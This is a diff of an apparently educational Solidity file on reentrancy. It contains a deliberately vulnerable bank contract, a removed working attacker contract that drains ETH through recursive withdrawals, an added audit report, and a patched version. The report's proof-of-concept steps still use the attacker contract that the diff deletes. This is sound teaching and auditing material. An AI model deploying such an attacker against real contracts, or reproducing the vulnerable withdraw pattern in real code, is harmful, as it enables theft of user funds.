@@ -74,60 +74,32 @@ Auditors inspect:
 VULNERABLE CONTRACT
 =========================================================
 */
-
 contract VulnerableBank {
 
-    /*
-        USER BALANCES
-    */
     mapping(address => uint256) public balances;
-
-    /*
-    =====================================================
-    DEPOSIT ETH
-    =====================================================
-    */
 
     function deposit()
         external
         payable
     {
-
-        /*
-            Store deposited ETH.
-        */
         balances[msg.sender] += msg.value;
     }
 
     /*
-    =====================================================
-    VULNERABLE WITHDRAW
-    =====================================================
-
-    BAD ORDER:
-    external call BEFORE state update.
+        VULNERABLE:
+        Interaction before Effects
     */
-
     function withdraw(
         uint256 _amount
     )
         external
     {
-
-        /*
-            CHECK:
-            user must have balance.
-        */
         require(
             balances[msg.sender] >= _amount,
             "Insufficient balance"
         );
 
-        /*
-            DANGEROUS EXTERNAL CALL
-
-            Control leaves contract HERE.
-        */
+        // External call first
         (bool success, ) =
             payable(msg.sender).call{
                 value: _amount
@@ -138,155 +110,16 @@ contract VulnerableBank {
             "Transfer failed"
         );
 
-        /*
-            STATE UPDATED TOO LATE
-
-            Vulnerability exists because:
-            attacker can reenter BEFORE this line.
-        */
+        // State update too late
         balances[msg.sender] -= _amount;
     }
-
-    /*
-    =====================================================
-    CHECK CONTRACT BALANCE
-    =====================================================
-    */
 
     function contractBalance()
         external
         view
         returns (uint256)
     {
-
         return address(this).balance;
-    }
-}
-
-/*
-=========================================================
-ATTACKER CONTRACT
-=========================================================
-*/
-
-contract ReentrancyAttacker {
-
-    /*
-        TARGET CONTRACT
-    */
-    VulnerableBank public target;
-
-    /*
-        OWNER
-    */
-    address public owner;
-
-    /*
-        ATTACK COUNTER
-    */
-    uint256 public attackCounter;
-
-    /*
-        LIMIT ATTACK LOOPS
-    */
-    uint256 public constant MAX_ATTACKS = 3;
-
-    /*
-        CONSTRUCTOR
-    */
-    constructor(address _target)
-    {
-
-        target = VulnerableBank(_target);
-
-        owner = msg.sender;
-    }
-
-    /*
-    =====================================================
-    DEPOSIT INTO TARGET
-    =====================================================
-    */
-
-    function depositToTarget()
-        external
-        payable
-    {
-
-        /*
-            Deposit ETH into victim contract.
-        */
-        target.deposit{value: msg.value}();
-    }
-
-    /*
-    =====================================================
-    START ATTACK
-    =====================================================
-    */
-
-    function attack()
-        external
-    {
-
-        /*
-            Trigger first withdraw.
-        */
-        target.withdraw(1 ether);
-    }
-
-    /*
-    =====================================================
-    RECEIVE FUNCTION
-    =====================================================
-
-    Automatically executes when
-    target sends ETH.
-    */
-
-    receive()
-        external
-        payable
-    {
-
-        /*
-            Reenter while target still has ETH.
-        */
-        if (
-            address(target).balance >= 1 ether
-            &&
-            attackCounter < MAX_ATTACKS
-        ) {
-
-            attackCounter++;
-
-            /*
-                REENTER TARGET
-
-                Balance NOT updated yet.
-            */
-            target.withdraw(1 ether);
-        }
-    }
-
-    /*
-    =====================================================
-    WITHDRAW STOLEN ETH
-    =====================================================
-    */
-
-    function withdrawLoot()
-        external
-    {
-
-        require(
-            msg.sender == owner,
-            "Not owner"
-        );
-
-        payable(owner).transfer(
-            address(this).balance
-        );
     }
 }
 
@@ -664,3 +497,188 @@ IMPORTANT CONCEPTS LEARNED
 
 =========================================================
 */
+/*
+Audit Report
+
+Title: Reentrancy Vulnerability Due to External Call Before State Update
+
+Severity: High because an attacker can repeatedly
+withdraw funds before their balance is updated,
+allowing theft of ETH stored in the contract.
+
+Location:
+Contract: VulnerableBank
+Function: withdraw()
+
+Vulnerability Description:
+
+The withdraw() function performs an external ETH
+transfer using call() before updating the user's
+stored balance.
+
+Since control is transferred to an untrusted
+external contract, a malicious receiver can
+re-enter withdraw() through its receive() or
+fallback() function before the balance reduction
+occurs.
+
+As a result, multiple withdrawals can be executed
+using the same balance.
+
+Impact:
+
+An attacker can drain ETH from the contract.
+
+Potential consequences include:
+
+- theft of user funds
+- complete contract balance drain
+- protocol insolvency
+- loss of user trust
+
+Proof of Concept:
+
+1. Deploy VulnerableBank
+
+2. Fund the contract with ETH
+
+3. Deploy ReentrancyAttacker
+
+4. Deposit 1 ETH into VulnerableBank
+   through attacker contract
+
+5. Call:
+
+       attack()
+
+6. VulnerableBank executes:
+
+       call{value: 1 ether}()
+
+7. Attacker receive() executes
+
+8. Attacker re-enters:
+
+       withdraw(1 ether)
+
+9. Balance remains unchanged because
+   storage update occurs after the call
+
+10. Multiple withdrawals succeed
+
+11. Contract ETH is drained
+
+Root Cause:
+
+The contract violates the
+Checks-Effects-Interactions (CEI) pattern.
+
+State updates occur after an external call.
+
+Vulnerable code:
+
+    (bool success, ) =
+        payable(msg.sender).call{
+            value: _amount
+        }("");
+
+    require(
+        success,
+        "Transfer failed"
+    );
+
+    balances[msg.sender] -= _amount;
+
+Recommendation:
+
+Update contract state before performing
+external interactions.
+
+Example:
+
+    balances[msg.sender] -= _amount;
+
+    (bool success, ) =
+        payable(msg.sender).call{
+            value: _amount
+        }("");
+
+Additionally, implement a reentrancy guard
+to prevent recursive execution.
+
+Example:
+
+    modifier nonReentrant() {
+        ...
+    }
+
+Status:
+
+Fixed in patched implementation.
+
+*/
+
+// Patched code
+contract SafeBank {
+
+    mapping(address => uint256) public balances;
+
+    bool private locked;
+
+    modifier nonReentrant() {
+        require(
+            !locked,
+            "Reentrancy detected"
+        );
+
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function deposit()
+        external
+        payable
+    {
+        balances[msg.sender] += msg.value;
+    }
+
+    /*
+        PATCHED:
+        Effects before Interaction
+        + Reentrancy protection
+    */
+    function withdraw(
+        uint256 _amount
+    )
+        external
+        nonReentrant
+    {
+        require(
+            balances[msg.sender] >= _amount,
+            "Insufficient balance"
+        );
+
+        // Effects
+        balances[msg.sender] -= _amount;
+
+        // Interaction
+        (bool success, ) =
+            payable(msg.sender).call{
+                value: _amount
+            }("");
+
+        require(
+            success,
+            "Transfer failed"
+        );
+    }
+
+    function contractBalance()
+        external
+        view
+        returns (uint256)
+    {
+        return address(this).balance;
+    }
+}
